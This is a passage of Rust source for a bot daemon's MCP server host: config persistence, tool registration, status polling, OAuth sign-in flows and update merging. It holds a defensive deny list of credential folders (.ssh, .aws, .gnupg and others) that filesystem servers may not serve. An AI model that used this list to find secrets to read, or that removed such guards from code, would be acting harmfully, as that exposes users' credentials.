//! MCP servers of `bot serve`: loads `<data dir>/mcp.toml`, connects the
//! servers through `mcp-bridge`, registers their tools into the daemon's tool
//! registry, and implements the `/v1/mcp/*` management API
//! ([`daemon_api::McpControl`]).  Every change made through the API is saved
//! back to `mcp.toml` (write temp file, fsync, rename) *before* it is applied.

use std::collections::{BTreeMap, HashMap};
use std::path::Path;
use std::sync::{
    Arc, Weak,
    atomic::{AtomicU64, Ordering},
};
use std::time::Duration;

use async_trait::async_trait;
use daemon_api::mcp::{
    McpAuthStart, McpAuthState, McpCatalogEntryDto, McpCatalogInstallDto, McpCatalogOAuthClientDto,
    McpCatalogTestDto, McpErrorKind as ErrorKindDto, McpFolderDto, McpOAuthConfig,
    McpRequiredSecretDto, McpServerChanged, McpServerDto, McpServerInput, McpStatus, McpTestResult,
    McpToolChangeDto, McpToolDto, McpTransportInput, McpTransportKind, McpTransportObject,
};
use daemon_api::mcp_import::{BundleApproval, ImportValues};
use daemon_api::{McpControl, McpControlError};
use mcp_bridge::{
    CatalogEntry, McpConfigStore, McpError, McpErrorKind, McpManager, McpPolicy, McpServerConfig,
    McpServerHandle, McpTransport, ServerSnapshot, ServerStatus, TomlFileStore,
};
use parking_lot::Mutex;
use secret_store::SecretStore;
use tokio::sync::broadcast;
use tool_registry::{PermissionCategory, ToolRegistry};

use crate::doctor::MCP_FILE;

/// How often the status poller looks for changes the API did not cause
/// (a quarantine after failing calls, a crashed child ...).
const POLL_EVERY: Duration = Duration::from_secs(2);
/// How a sign-in flow ended: `None` while it runs, then `Ok` or a message.
type FlowOutcome = Option<Result<(), String>>;

/// One user-started sign-in.  It stays in `McpHost::auth_flows` until its
/// task has finished, through the token exchange and the reconnect, so every
/// cancel, logout, update, removal or new start can abort and join it.
struct SignInFlow {
    task: tokio::task::JoinHandle<Result<(), McpError>>,
    /// Where a pasted redirect goes (headless hosts); taken by the first paste.
    paste: Option<tokio::sync::oneshot::Sender<String>>,
    /// Set by the task when it ends; a waiting paste request watches it.
    done: tokio::sync::watch::Receiver<FlowOutcome>,
}

impl SignInFlow {
    /// Still exchanging or reconnecting (an outcome is final even if the
    /// task has not quite returned yet).
    fn running(&self) -> bool {
        !self.task.is_finished() && self.done.borrow().is_none()
    }
}

const FILE_HEADER: &str = "\
# MCP servers of this bot (managed by the app; you may edit it while the daemon is stopped).\n\
# Example:\n\
#\n\
# [[server]]\n\
# id = \"files\"\n\
# category = \"fs\"\n\
# [server.transport]\n\
# type = \"stdio\"\n\
# command = \"npx\"\n\
# args = [\"-y\", \"@modelcontextprotocol/server-filesystem@2.2.0\", \"/path/to/a/folder\"]\n\
# [server.secret_env]\n\
# API_KEY = \"mcp/files-key\"   # name of a secret, never its value\n";

/// The running MCP servers of a daemon.
pub struct McpHost {
    /// Held across start/cancel/logout and replacement, so an old callback
    /// cannot persist credentials after cancellation or removal returns.
    auth_flows: tokio::sync::Mutex<HashMap<String, SignInFlow>>,
    manager: McpManager,
    registry: ToolRegistry,
    store: TomlFileStore,
    data_dir: std::path::PathBuf,
    catalog: Vec<CatalogEntry>,
    /// Default folder offered for filesystem servers (never a protected one).
    folder_suggestion: Option<String>,
    root_guard: mcp_bridge::PathGuard,
    /// The configured servers (what `mcp.toml` holds), by name.
    configs: Mutex<BTreeMap<String, McpServerConfig>>,
    /// Servers whose connect is in flight.
    connecting: Mutex<HashMap<String, u64>>,
    next_connect: AtomicU64,
    /// Last status announced per server (deduplicates events).
    announced: Mutex<HashMap<String, McpStatus>>,
    /// Serialises local configuration/registry changes, never remote I/O.
    ops: tokio::sync::Mutex<()>,
    /// Set when `mcp.toml` could not be loaded: it is never overwritten then.
    broken: Option<String>,
    events: broadcast::Sender<McpServerChanged>,
    poller: Mutex<Option<tokio::task::JoinHandle<()>>>,
    /// The daemon's production redactor (audit rows of MCP routes).
    redactor: Option<mcp_bridge::ExternalRedactor>,
    /// Where the OAuth client secrets live (to forget one with its last server).
    secrets: Option<Arc<dyn SecretStore>>,
}

impl McpHost {
    /// Load `<data_dir>/mcp.toml` (created when absent), register the servers
    /// and connect them in the background (a server that fails is logged and
    /// stays listed with `status: error`; it never aborts the daemon).  Must be
    /// called inside a tokio runtime.
    pub fn start(
        data_dir: &Path,
        registry: ToolRegistry,
        secrets: Option<Arc<dyn SecretStore>>,
        redactor: Option<mcp_bridge::ExternalRedactor>,
        registrar: Option<mcp_bridge::oauth::SecretRegistrar>,
    ) -> Arc<Self> {
        Self::start_with_policy(
            data_dir,
            registry,
            secrets,
            redactor,
            registrar,
            McpPolicy::default(),
        )
    }

    /// [`Self::start`] with a custom bridge policy (tests use short timeouts).
    pub fn start_with_policy(
        data_dir: &Path,
        registry: ToolRegistry,
        secrets: Option<Arc<dyn SecretStore>>,
        redactor: Option<mcp_bridge::ExternalRedactor>,
        registrar: Option<mcp_bridge::oauth::SecretRegistrar>,
        policy: McpPolicy,
    ) -> Arc<Self> {
        let path = data_dir.join(MCP_FILE);
        let store = TomlFileStore::new(&path);
        if !path.exists()
            && let Err(e) = std::fs::write(&path, FILE_HEADER)
        {
            support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: cannot create {}: {e}", path.display());
        }
        let (mut loaded, mut broken) = match store.load() {
            Ok(l) => (l, None),
            Err(e) => {
                support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: {e}; MCP servers are not started");
                (Vec::new(), Some(e.to_string()))
            }
        };
        let guard = root_guard(data_dir);
        let folder_suggestion = suggest_folder(&guard);
        let before = loaded.clone();
        for cfg in &mut loaded {
            canonicalize_config(cfg, &guard);
        }
        if loaded
            .iter()
            .zip(&before)
            .any(|(a, b)| a.transport != b.transport)
            && broken.is_none()
            && let Err(e) = store.save(&loaded)
        {
            broken = Some(e.to_string());
            // Do not start configurations whose canonical form could not be saved.
            loaded.clear();
        }
        // Approved tool fingerprints live next to `mcp.toml`; a tool whose
        // definition changes later stays off until the owner approves it.
        let mut manager = McpManager::with_policy(registry.clone(), policy)
            .with_path_guard(guard.clone())
            .with_pin_store(Arc::new(mcp_bridge::FilePinStore::open(
                data_dir.join("mcp-tool-pins.json"),
            )));
        if let Some(s) = &secrets {
            manager = manager.with_secret_store(Arc::clone(s));
        }
        // The daemon's live redactor masks every MCP diagnostic (stderr,
        // rmcp warnings, connect and discovery errors).
        if let Some(r) = redactor.clone() {
            manager = manager.with_redactor(r);
        }
        if let Some(register) = registrar {
            manager = manager.with_secret_registrar(register);
        }
        let catalog = mcp_bridge::builtin_catalog().unwrap_or_else(|e| {
            support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: {e}");
            Vec::new()
        });
        // Register synchronously before returning the host. Background futures
        // hold the exact registration, so removal/replacement cannot resurrect it.
        let registrations: Vec<_> = loaded
            .iter()
            .filter_map(|cfg| match manager.register_server(cfg.clone()) {
                Ok(handle) => Some((cfg.id.clone(), cfg.enabled, handle)),
                Err(error) => {
                    support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: MCP server {} not registered: {error}", cfg.id);
                    None
                }
            })
            .collect();
        let host = Arc::new(Self {
            auth_flows: tokio::sync::Mutex::new(HashMap::new()),
            manager,
            registry,
            store,
            data_dir: data_dir.to_owned(),
            catalog,
            folder_suggestion,
            root_guard: guard,
            configs: Mutex::new(loaded.iter().map(|c| (c.id.clone(), c.clone())).collect()),
            connecting: Mutex::new(HashMap::new()),
            next_connect: AtomicU64::new(1),
            announced: Mutex::new(HashMap::new()),
            ops: tokio::sync::Mutex::new(()),
            broken,
            events: broadcast::channel(64).0,
            poller: Mutex::new(None),
            redactor,
            secrets,
        });
        for c in &loaded {
            host.announced
                .lock()
                .insert(c.id.clone(), host.status_of(&c.id));
        }
        // Each server discovers independently; configuration changes remain live.
        for (id, enabled, handle) in registrations {
            let generation = host.begin_connect(&id, enabled);
            let h = Arc::clone(&host);
            tokio::spawn(async move {
                h.connect_registered(&id, generation, handle, false).await;
            });
        }
        Self::forward_change_events(&host);
        let weak = Arc::downgrade(&host);
        *host.poller.lock() = Some(tokio::spawn(poll(weak)));
        host
    }

    /// Disconnect every server (stdio children exit) and stop the poller.
    pub async fn shutdown(&self) {
        let mut flows = self.auth_flows.lock().await;
        for (_, flow) in flows.drain() {
            flow.task.abort();
            let _ = flow.task.await;
        }
        drop(flows);
        if let Some(p) = self.poller.lock().take() {
            p.abort();
        }
        self.manager.shutdown().await;
    }

    /// The names of the registered tools of `name` (`mcp:<name>/<tool>`).
    fn snapshot(&self, name: &str) -> Option<ServerSnapshot> {
        self.manager.snapshot(name)
    }

    fn status_of(&self, name: &str) -> McpStatus {
        if self.connecting.lock().contains_key(name) {
            return McpStatus::Connecting;
        }
        match self.snapshot(name) {
            Some(s) if s.auth_required => McpStatus::AuthRequired,
            Some(s) => match s.status {
                ServerStatus::Connected => McpStatus::Connected,
                ServerStatus::Quarantined => McpStatus::Quarantined,
                ServerStatus::Disconnected if s.last_error.is_some() => McpStatus::Error,
                ServerStatus::Disabled | ServerStatus::Disconnected => McpStatus::Disconnected,
            },
            None => McpStatus::Disconnected,
        }
    }

    /// Announce the current status of `name` when it differs from the last one.
    fn announce(&self, name: &str) {
        let status = self.status_of(name);
        let changed = self.announced.lock().insert(name.to_owned(), status) != Some(status);
        if changed {
            // No subscriber is not an error.
            let _ = self.events.send(McpServerChanged::new(name, status));
        }
    }

    /// A server that swaps a held-back definition while a card is on screen
    /// must make the UI reload it, although its status stays `connected`.
    fn forward_change_events(host: &Arc<Self>) {
        let mut changes = host.manager.subscribe_changes();
        let weak = Arc::downgrade(host);
        tokio::spawn(async move {
            loop {
                match changes.recv().await {
                    Ok(id) => {
                        let Some(host) = weak.upgrade() else {
                            return;
                        };
                        host.notify_changed(&id);
                    }
                    Err(broadcast::error::RecvError::Lagged(_)) => {}
                    Err(broadcast::error::RecvError::Closed) => return,
                }
            }
        });
    }

    /// Tell clients to reload `name` even though its status did not move.
    fn notify_changed(&self, name: &str) {
        let status = self.status_of(name);
        let _ = self.events.send(McpServerChanged::new(name, status));
    }

    fn forget(&self, name: &str) {
        self.announced.lock().remove(name);
        let _ = self
            .events
            .send(McpServerChanged::new(name, McpStatus::Disconnected));
    }

    fn dto(&self, cfg: &McpServerConfig) -> McpServerDto {
        let snap = self.snapshot(&cfg.id);
        let (transport, command, args, url, env, cwd, headers) = match &cfg.transport {
            McpTransport::Stdio {
                command,
                args,
                env,
                cwd,
            } => (
                McpTransportKind::Stdio,
                Some(command.clone()),
                Some(args.clone()),
                None,
                env.clone(),
                cwd.as_ref().map(|p| p.display().to_string()),
                BTreeMap::new(),
            ),
            McpTransport::Http { url, headers } => (
                McpTransportKind::Http,
                None,
                None,
                Some(url.clone()),
                BTreeMap::new(),
                None,
                headers.clone(),
            ),
        };
        McpServerDto {
            oauth: cfg.oauth.as_ref().map(|c| McpOAuthConfig {
                client_id: c.client_id.clone(),
                client_secret_ref: c.client_secret_ref.clone(),
                client_metadata_url: c.client_metadata_url.clone(),
                allow_loopback_http: c.allow_loopback_http,
                issuer: c.issuer.clone(),
                scopes: c.scopes.clone(),
                offline_access: c.offline_access,
            }),
            name: cfg.id.clone(),
            transport,
            command,
            args,
            url,
            env,
            cwd,
            headers,
            tool_allow: cfg.tool_allow.clone(),
            tool_exclude: cfg.tool_exclude.clone(),
            secret_env: cfg.secret_env.clone(),
            secret_headers: cfg.secret_headers.clone(),
            enabled: cfg.enabled,
            status: self.status_of(&cfg.id),
            error: snap.as_ref().and_then(|s| s.last_error.clone()),
            error_kind: snap
                .as_ref()
                .and_then(|s| s.last_error_kind)
                .map(error_kind_dto),
            stderr_tail: if snap.as_ref().is_some_and(|s| s.last_error.is_some()) {
                error_stderr_tail(&self.manager.stderr_tail(&cfg.id))
            } else {
                Vec::new()
            },
            tool_count: snap
                .as_ref()
                .map_or(0, |s| u32::try_from(s.tools.len()).unwrap_or(u32::MAX)),
            category: category_name(cfg.effective_category()),
            trust_hints: cfg.trust_hints,
            public_content: cfg.public_content,
            local_only: cfg.local_only,
            browser: cfg.browser,
            is_browser: cfg.is_browser(),
            bots: cfg.bots.clone(),
            changed_tools: snap
                .as_ref()
                .map(|s| {
                    s.changed_tools
                        .iter()
                        .map(|c| McpToolChangeDto {
                            tool: c.tool.clone(),
                            before: c.before.clone(),
                            after: c.after.clone(),
                            description_changed: c.description_changed,
                            schema_changed: c.schema_changed,
                            other_changed: c.other_changed,
                            new_tool: c.new_tool,
                            hash: c.hash.clone(),
                        })
                        .collect()
                })
                .unwrap_or_default(),
        }
    }

    fn config_of(&self, name: &str) -> Result<McpServerConfig, McpControlError> {
        self.configs
            .lock()
            .get(name)
            .cloned()
            .ok_or_else(|| McpControlError::NotFound(format!("mcp server {name}")))
    }

    /// Whether a configured server still refers to the secret `reference`
    /// (as its OAuth client secret, a header or an environment variable).
    fn secret_in_use(&self, reference: &str, except: Option<&str>) -> bool {
        self.configs
            .lock()
            .values()
            .filter(|c| Some(c.id.as_str()) != except)
            .any(|c| {
                c.oauth
                    .as_ref()
                    .and_then(|o| o.client_secret_ref.as_deref())
                    == Some(reference)
                    || c.secret_headers
                        .values()
                        .chain(c.secret_env.values())
                        .any(|v| v.contains(reference))
            })
    }

    fn check_http(&self, name: &str) -> Result<(), McpControlError> {
        if !matches!(self.config_of(name)?.transport, McpTransport::Http { .. }) {
            return Err(invalid("OAuth applies only to HTTP servers"));
        }
        Ok(())
    }

    fn check_writable(&self) -> Result<(), McpControlError> {
        match &self.broken {
            None => Ok(()),
            Some(why) => Err(McpControlError::Internal(format!(
                "{MCP_FILE} could not be loaded ({why}); fix or remove it and restart the daemon"
            ))),
        }
    }

    /// Persist `configs` with `change` applied; the in-memory map is updated
    /// only after the file was written.
    fn persist(
        &self,
        change: impl FnOnce(&mut BTreeMap<String, McpServerConfig>),
    ) -> Result<(), McpControlError> {
        let mut configs = self.configs.lock();
        let mut next = configs.clone();
        change(&mut next);
        let list: Vec<McpServerConfig> = next.values().cloned().collect();
        self.store.save(&list).map_err(map_err)?;
        *configs = next;
        Ok(())
    }

    fn publish_import(&self, cfg: &McpServerConfig) -> Result<McpServerDto, McpControlError> {
        let name = &cfg.id;
        if self.configs.lock().contains_key(name) {
            return Err(McpControlError::Conflict(format!(
                "mcp server {name} already exists"
            )));
        }
        self.manager.register_server(cfg.clone()).map_err(map_err)?;
        if let Err(error) = self.persist(|configs| {
            configs.insert(name.clone(), cfg.clone());
        }) {
            // Only disabled imports reach this branch, so no process needs closing.
            let _ = self.manager.detach_server(name);
            return Err(error);
        }
        self.announce(name);
        Ok(self.dto(cfg))
    }

    // Called with the sign-in and config mutation locks held. Keep a disabled
    // config available for retry until all owned resources are removed.
    async fn remove_import(
        &self,
        cfg: &McpServerConfig,
        import: &mcp_bridge::McpImport,
    ) -> Result<(), McpControlError> {
        let name = &cfg.id;
        if cfg.enabled {
            self.persist(|configs| {
                let mut disabled = cfg.clone();
                disabled.enabled = false;
                configs.insert(name.clone(), disabled);
            })?;
        }
        match self.manager.detach_server(name) {
            Ok(server) => server.close().await,
            Err(McpError::UnknownServer(_)) => {}
            Err(error) => return Err(map_err(error)),
        }
        self.connecting.lock().remove(name);
        self.notify_changed(name);

        let mut references: Vec<_> = import
            .secrets
            .iter()
            .filter(|reference| {
                import_secret_reference(reference) && !self.secret_in_use(reference, Some(name))
            })
            .cloned()
            .collect();
        if import.bundle_sha256.is_none() {
            references.extend([
                mcp_bridge::oauth::registered_client_name(name),
                mcp_bridge::oauth::credential_name(name),
            ]);
        }
        if let Some(store) = &self.secrets {
            for reference in references {
                store.delete(&reference).map_err(|_| {
                    McpControlError::Internal("could not delete an imported MCP credential".into())
                })?;
            }
        } else if !import.secrets.is_empty() {
            return Err(McpControlError::Internal(
                "the imported MCP secret store is unavailable".into(),
            ));
        }
        if import.bundle_sha256.is_some() {
            mcp_bridge::mcpb::remove_files(&self.data_dir, name).map_err(map_err)?;
        }
        self.persist(|configs| {
            configs.remove(name);
        })?;
        self.manager.forget_tool_pins(name);
        self.forget(name);
        Ok(())
    }

    fn begin_connect(&self, id: &str, enabled: bool) -> Option<u64> {
        if !enabled {
            return None;
        }
        let generation = self.next_connect.fetch_add(1, Ordering::Relaxed);
        self.connecting.lock().insert(id.to_owned(), generation);
        self.announce(id);
        Some(generation)
    }

    /// Finishing an obsolete operation must not clear a newer Connecting state.
    fn finish_connect(&self, id: &str, generation: Option<u64>) {
        if let Some(generation) = generation {
            let mut connecting = self.connecting.lock();
            if connecting.get(id) != Some(&generation) {
                return;
            }
            connecting.remove(id);
        }
        self.announce(id);
    }

    async fn connect_registered(
        &self,
        id: &str,
        generation: Option<u64>,
        handle: McpServerHandle,
        reenable: bool,
    ) {
        let result = if reenable {
            handle.reenable().await
        } else {
            handle.connect().await
        };
        if let Err(error) = result {
            support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: MCP server {id} not started: {error}");
            // The child's own explanation (already secret-redacted).
            for line in error_stderr_tail(&self.manager.stderr_tail(id))
                .iter()
                .rev()
                .take(5)
                .rev()
            {
                support_logs::tracing::warn!(target: "praxi_support", reason = "component_warning", "warning: MCP server {id} stderr: {line}");
            }
        }
        self.finish_connect(id, generation);
    }
}

async fn poll(host: Weak<McpHost>) {
    let mut tick = tokio::time::interval(POLL_EVERY);
    loop {
        tick.tick().await;
        let Some(h) = host.upgrade() else { return };
        let names: Vec<String> = h.configs.lock().keys().cloned().collect();
        for n in names {
            h.announce(&n);
        }
    }
}

/// Folder names that hold credentials; a filesystem root may not be one, nor
/// lie inside one.
const CREDENTIAL_DIRS: [&str; 6] = [".ssh", ".aws", ".gnupg", ".kube", ".azure", ".docker"];

/// The check every filesystem-server folder passes before it is served: not
/// the daemon's data folder (or one containing it, e.g. the home folder), not
/// a credential location, not the folder the app is installed in, and not a
/// drive / filesystem root. Reasons are fixed text (no paths).
fn root_guard(data_dir: &Path) -> mcp_bridge::PathGuard {
    let install_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(Path::to_path_buf));
    root_guard_with_install(data_dir, install_dir.as_deref())
}

fn root_guard_with_install(data_dir: &Path, install_dir: Option<&Path>) -> mcp_bridge::PathGuard {
    use builtin_tools::files::{is_protected_root, resolve_local_folder};
    let data_dir = resolve_local_folder(data_dir);
    let install_dir = install_dir.map(resolve_local_folder);
    Arc::new(move |root: &Path| {
        let root = resolve_local_folder(root)
            .map_err(|_| "this folder cannot be safely resolved".to_owned())?;
        let data = data_dir
            .as_ref()
            .map_err(|_| "the data folder cannot be safely resolved".to_owned())?;
        if root.parent().is_none() {
            return Err("a whole drive is too broad, choose a folder".to_owned());
        }
        if is_protected_root(&root, data) {
            return Err(
                "this folder holds or contains Praxi-Bot's own data or credentials".to_owned(),
            );
        }
        if root.components().any(|c| {
            CREDENTIAL_DIRS
                .iter()
                .any(|n| c.as_os_str().eq_ignore_ascii_case(n))
        }) {
            return Err("this folder holds credentials or settings".to_owned());
        }
        if let Some(install) = &install_dir {
            let install = install
                .as_ref()
                .map_err(|_| "the install folder cannot be safely resolved".to_owned())?;
            // is_protected_root supplies the same canonical component and
            // Windows case comparison as the data-directory boundary.
            if is_protected_root(&root, install) {
                return Err("this is the app's own install folder".to_owned());
            }
        }
        Ok(root)
    })
}

fn canonicalize_config(cfg: &mut McpServerConfig, guard: &mcp_bridge::PathGuard) {
    if let McpTransport::Stdio { args, .. } = &mut cfg.transport {
        // Invalid legacy roots stay editable and connect reports NeedsFolder.
        let _ = mcp_bridge::canonicalize_filesystem_args(args, Some(guard));
    }
}

/// The user's Documents folder when it exists and passes the guard.
fn suggest_folder(guard: &mcp_bridge::PathGuard) -> Option<String> {
    let home = std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME"))?;
    let docs = Path::new(&home).join("Documents");
    guard(&docs).ok().map(|p| p.display().to_string())
}

fn error_kind_dto(kind: McpErrorKind) -> ErrorKindDto {
    match kind {
        McpErrorKind::RuntimeMissing => ErrorKindDto::RuntimeMissing,
        McpErrorKind::Spawn => ErrorKindDto::Spawn,
        McpErrorKind::Closed => ErrorKindDto::Closed,
        McpErrorKind::Timeout => ErrorKindDto::Timeout,
        McpErrorKind::Config => ErrorKindDto::Config,
        McpErrorKind::NeedsFolder => ErrorKindDto::NeedsFolder,
        McpErrorKind::Other => ErrorKindDto::Other,
    }
}

/// How many stderr lines / bytes the status API carries (the bridge keeps more
/// and has already redacted every line).
const API_STDERR_LINES: usize = 30;
const API_STDERR_BYTES: usize = 8 * 1024;

/// The last lines of `lines`, bounded in count and total size.
fn error_stderr_tail(lines: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut bytes = 0usize;
    for line in lines.iter().rev().take(API_STDERR_LINES) {
        let line = line.trim_end();
        if line.is_empty() {
            continue;
        }
        if bytes + line.len() > API_STDERR_BYTES {
            break;
        }
        bytes += line.len();
        out.push(line.to_owned());
    }
    out.reverse();
    out
}

fn category_name(c: PermissionCategory) -> String {
    serde_json::to_value(c)
        .ok()
        .and_then(|v| v.as_str().map(str::to_owned))
        .unwrap_or_else(|| "accounts".to_owned())
}

fn map_err(e: McpError) -> McpControlError {
    e.into()
}

fn import_secret_reference(reference: &str) -> bool {
    reference
        .strip_prefix("mcp/import-")
        .and_then(|rest| rest.split_once('/'))
        .is_some_and(|(id, index)| {
            uuid::Uuid::parse_str(id).is_ok() && index.parse::<usize>().is_ok()
        })
}

/// Abort `name`'s flow and wait until its task is gone: afterwards it can
/// neither exchange a code nor reconnect (and the manager's credential guard
/// refuses any save it might still have attempted).
async fn abort_sign_in(flows: &mut HashMap<String, SignInFlow>, name: &str) {
    if let Some(flow) = flows.remove(name) {
        flow.task.abort();
        let _ = flow.task.await;
    }
}

/// Only a secret the apps made for themselves (`mcp_<app>_...`, as the desktop
/// names a client secret, or `mcp/<app>/...`) is deleted with its last server:
/// never a sign-in record, a host credential or one owned by another feature,
/// even when a hand-edited `mcp.toml` points at it.
fn forgettable_client_secret(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    (lower.starts_with("mcp_") || lower.starts_with("mcp/"))
        && !secret_store::is_managed_oauth_name(name)
        && !secret_store::is_host_credential(name)
        && !secret_store::is_reserved_name(name)
        && !secret_store::is_fill_name(name)
}

fn invalid(m: impl Into<String>) -> McpControlError {
    McpControlError::Invalid(m.into())
}

fn json_str(v: &serde_json::Value, field: &str) -> Result<String, McpControlError> {
    v.as_str()
        .map(str::to_owned)
        .ok_or_else(|| invalid(format!("`{field}` must be a string")))
}

fn json_bool(v: &serde_json::Value, field: &str) -> Result<bool, McpControlError> {
    v.as_bool()
        .ok_or_else(|| invalid(format!("`{field}` must be a boolean")))
}

/// Keep the first occurrence of every id.
fn dedup_ids(ids: Vec<String>) -> Vec<String> {
    let mut seen = std::collections::HashSet::new();
    ids.into_iter()
        .filter(|id| seen.insert(id.clone()))
        .collect()
}

fn json_strings(v: &serde_json::Value, field: &str) -> Result<Vec<String>, McpControlError> {
    let arr = v
        .as_array()
        .ok_or_else(|| invalid(format!("`{field}` must be an array of strings")))?;
    arr.iter()
        .map(|item| {
            item.as_str()
                .map(str::to_owned)
                .ok_or_else(|| invalid(format!("`{field}` must be an array of strings")))
        })
        .collect()
}

fn json_map(
    v: &serde_json::Value,
    field: &str,
) -> Result<BTreeMap<String, String>, McpControlError> {
    let obj = v
        .as_object()
        .ok_or_else(|| invalid(format!("`{field}` must be an object of strings")))?;
    let mut out = BTreeMap::new();
    for (k, val) in obj {
        let s = val
            .as_str()
            .ok_or_else(|| invalid(format!("`{field}.{k}` must be a string")))?;
        out.insert(k.clone(), s.to_owned());
    }
    Ok(out)
}

fn apply_transport_fields(
    cfg: &mut McpServerConfig,
    obj: &serde_json::Map<String, serde_json::Value>,
) -> Result<(), McpControlError> {
    match &mut cfg.transport {
        McpTransport::Stdio {
            command,
            args,
            env,
            cwd,
        } => {
            if let Some(v) = obj.get("command") {
                *command = json_str(v, "command")?;
            }
            if let Some(v) = obj.get("args") {
                *args = json_strings(v, "args")?;
            }
            if let Some(v) = obj.get("env") {
                *env = json_map(v, "env")?;
            }
            if let Some(v) = obj.get("cwd") {
                *cwd = if v.is_null() {
                    None
                } else {
                    Some(json_str(v, "cwd")?.into())
                };
            }
        }
        McpTransport::Http { url, headers } => {
            if let Some(v) = obj.get("url") {
                *url = json_str(v, "url")?;
            }
            if let Some(v) = obj.get("headers") {
                *headers = json_map(v, "headers")?;
            }
        }
    }
    Ok(())
}

fn set_transport_kind(cfg: &mut McpServerConfig, kind: &str) -> Result<(), McpControlError> {
    match (kind, &cfg.transport) {
        ("stdio", McpTransport::Stdio { .. }) | ("http", McpTransport::Http { .. }) => Ok(()),
        ("stdio", McpTransport::Http { .. }) => {
            cfg.transport = McpTransport::Stdio {
                command: String::new(),
                args: Vec::new(),
                env: BTreeMap::new(),
                cwd: None,
            };
            cfg.secret_headers.clear();
            Ok(())
        }
        ("http", McpTransport::Stdio { .. }) => {
            cfg.transport = McpTransport::Http {
                url: String::new(),
                headers: BTreeMap::new(),
            };
            cfg.secret_env.clear();
            Ok(())
        }
        _ => Err(invalid(format!("unknown transport `{kind}`"))),
    }
}

/// Whether a PUT body touches nothing but the bot list (no restart needed).
fn bots_only(patch: &serde_json::Value) -> bool {
    patch.as_object().is_some_and(|o| {
        o.keys().all(|k| {
            matches!(
                k.as_str(),
                "name" | "id" | "bots" | "bots_add" | "bots_remove"
            )
        })
    })
}

/// Merge a PUT body onto `prev`. Keys that are absent keep the stored value.
/// `bots: null` clears the allowlist (every bot).
fn merge_update(
    prev: &McpServerConfig,
    patch: &serde_json::Value,
) -> Result<McpServerConfig, McpControlError> {
    let obj = patch
        .as_object()
        .ok_or_else(|| invalid("body must be a JSON object"))?;
    if let Some(name) = obj.get("name").or_else(|| obj.get("id"))
        && !name.is_null()
    {
        let name = json_str(name, "name")?;
        if name != prev.id {
            return Err(invalid(
                "the name in the body differs from the one in the path; delete and add to rename",
            ));
        }
    }
    let mut cfg = prev.clone();
    if let Some(value) = obj.get("oauth") {
        cfg.oauth = serde_json::from_value(value.clone()).map_err(|_| {
            invalid("invalid OAuth settings; use client_secret_ref, never a secret value")
        })?;
    }
    if let Some(transport) = obj.get("transport") {
        match transport {
            serde_json::Value::String(kind) => set_transport_kind(&mut cfg, kind)?,
            serde_json::Value::Object(inner) => {
                let kind = inner
                    .get("type")
                    .and_then(serde_json::Value::as_str)
                    .ok_or_else(|| invalid("transport.type is required"))?;
                set_transport_kind(&mut cfg, kind)?;
                apply_transport_fields(&mut cfg, inner)?;
            }
            serde_json::Value::Null => return Err(invalid("transport cannot be null")),
            _ => {
                return Err(invalid(
                    "transport must be \"stdio\", \"http\", or an object",
                ));
            }
        }
    }
    apply_transport_fields(&mut cfg, obj)?;
    if let Some(v) = obj.get("enabled") {
        cfg.enabled = json_bool(v, "enabled")?;
    }
    if let Some(v) = obj.get("tool_allow") {
        cfg.tool_allow = json_strings(v, "tool_allow")?;
    }
    if let Some(v) = obj.get("tool_exclude") {
        cfg.tool_exclude = json_strings(v, "tool_exclude")?;
    }
    for (key, slot) in [
        ("trust_hints", &mut cfg.trust_hints),
        ("public_content", &mut cfg.public_content),
        ("local_only", &mut cfg.local_only),
        ("browser", &mut cfg.browser),
    ] {
        if let Some(v) = obj.get(key) {
            *slot = json_bool(v, key)?;
        }
    }
    if let Some(v) = obj.get("category") {
        cfg.category = if v.is_null() {
            None
        } else {
            let c = json_str(v, "category")?;
            Some(
                serde_json::from_value(serde_json::Value::String(c.clone()))
                    .map_err(|_| invalid(format!("unknown category `{c}`")))?,
            )
        };
    }
    if let Some(v) = obj.get("secret_headers") {
        cfg.secret_headers = json_map(v, "secret_headers")?;
    }
    if let Some(v) = obj.get("secret_env") {
        cfg.secret_env = json_map(v, "secret_env")?;
    }
    if let Some(v) = obj.get("bots") {
        cfg.bots = if v.is_null() {
            None
        } else {
            Some(dedup_ids(json_strings(v, "bots")?))
        };
    }
    // Atomic add / remove of single ids on the stored list (the caller holds
    // the host lock).  An open server (`None`) stays open under both.
    if let Some(v) = obj.get("bots_add").filter(|v| !v.is_null()) {
        let add = json_strings(v, "bots_add")?;
        if let Some(list) = cfg.bots.as_mut() {
            for id in add {
                if !list.contains(&id) {
                    list.push(id);
                }
            }
        }
    }
    if let Some(v) = obj.get("bots_remove").filter(|v| !v.is_null()) {
        let remove = json_strings(v, "bots_remove")?;
        if let Some(list) = cfg.bots.as_mut() {
            list.retain(|id| !remove.contains(id));
        }
    }
    cfg.validate().map_err(map_err)?;
    Ok(cfg)
}

/// Turn an API body into a validated bridge config.
fn to_config(name: &str, input: McpServerInput) -> Result<McpServerConfig, McpControlError> {
    let invalid = |m: &str| McpControlError::Invalid(m.to_owned());
    let transport = match input.transport {
        McpTransportInput::Object(McpTransportObject::Stdio {
            command,
            args,
            env,
            cwd,
        }) => McpTransport::Stdio {
            command,
            args,
            env,
            cwd: cwd.map(Into::into),
        },
        McpTransportInput::Object(McpTransportObject::Http { url, headers }) => {
            McpTransport::Http { url, headers }
        }
        McpTransportInput::Kind(McpTransportKind::Stdio) => McpTransport::Stdio {
            command: input
                .command
                .ok_or_else(|| invalid("`command` is required for a stdio server"))?,
            args: input.args.unwrap_or_default(),
            env: input.env,
            cwd: input.cwd.map(Into::into),
        },
        McpTransportInput::Kind(McpTransportKind::Http) => McpTransport::Http {
            url: input
                .url
                .ok_or_else(|| invalid("`url` is required for an http server"))?,
            headers: input.headers,
        },
    };
    let category = match input.category {
        None => None,
        Some(c) => Some(
            serde_json::from_value::<PermissionCategory>(serde_json::Value::String(c.clone()))
                .map_err(|_| McpControlError::Invalid(format!("unknown category `{c}`")))?,
        ),
    };
    let cfg = McpServerConfig {
        import: None,
